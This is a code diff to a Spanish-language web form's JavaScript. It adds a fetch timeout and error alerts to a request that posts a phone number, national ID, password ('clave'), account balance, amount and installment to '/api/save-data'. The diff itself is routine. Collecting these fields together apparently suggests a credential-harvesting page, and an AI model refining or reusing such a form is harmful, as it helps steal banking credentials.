@@ -74,6 +74,12 @@ document.addEventListener('DOMContentLoaded', () => {
         btnConfirmar.textContent = 'Enviando...';
         btnConfirmar.disabled = true;
 
+        // Abort controller for timeout
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => {
+            controller.abort();
+        }, 10000); // 10-second timeout
+
         try {
             // Send data to server
             const response = await fetch('/api/save-data', {
@@ -81,8 +87,11 @@ document.addEventListener('DOMContentLoaded', () => {
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ celular, cedula, clave, saldo, monto, cuota })
+                body: JSON.stringify({ celular, cedula, clave, saldo, monto, cuota }),
+                signal: controller.signal
             });
+
+            clearTimeout(timeoutId); // Clear timeout if fetch is successful
 
             const result = await response.json();
             
@@ -124,11 +133,16 @@ document.addEventListener('DOMContentLoaded', () => {
                 alert('Error de conexión. Intente nuevamente.');
                 btnConfirmar.textContent = originalText;
                 btnConfirmar.disabled = false;
-            }
+        }
 
         } catch (error) {
-            console.error('Error:', error);
-            alert('Error al conectar con el servidor.');
+            clearTimeout(timeoutId); // Ensure timeout is cleared
+            if (error.name === 'AbortError') {
+                alert('El servidor no respondió a tiempo. Intente de nuevo.');
+            } else {
+                console.error('Error:', error);
+                alert('Error al conectar con el servidor.');
+            }
             btnConfirmar.textContent = originalText;
             btnConfirmar.disabled = false;
         }
